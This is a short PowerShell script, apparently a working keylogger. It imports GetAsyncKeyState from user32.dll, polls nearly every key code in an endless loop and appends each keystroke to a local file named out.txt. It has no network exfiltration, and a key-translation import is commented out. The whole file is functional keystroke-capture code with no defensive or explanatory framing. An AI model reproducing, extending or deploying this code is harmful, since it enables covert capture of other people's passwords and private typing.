
#Import checking key status.
$Sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@
Add-Type -MemberDefinition $Sig -Name Keyboard -Namespace PsOneApi
#$Sig2 = @'
#[DllImport("user32.dll", CharSet=CharSet.Auto)]
#public static extern int MapVirtualKey(uint uCode, int uMapType);
#'@
#Import translate ascii num to ascii char
#$TRANSLATE = $API::MapVirtualKey($ascii, 3)
Write-Host "Running..."
try{
    while($true){
        Start-Sleep -Milliseconds 40
        for ($key_num=8; $key_num -le 254; $key_num++){
            $key_pressed = [PsOneApi.Keyboard]::GetAsyncKeyState($key_num)
            if ($key_pressed -eq -32767){
                $asc = [char]$key_num
                Add-Content -Path '.\out.txt' -Value $asc -NoNewLine
            }
        }
    }
}
finally{

}
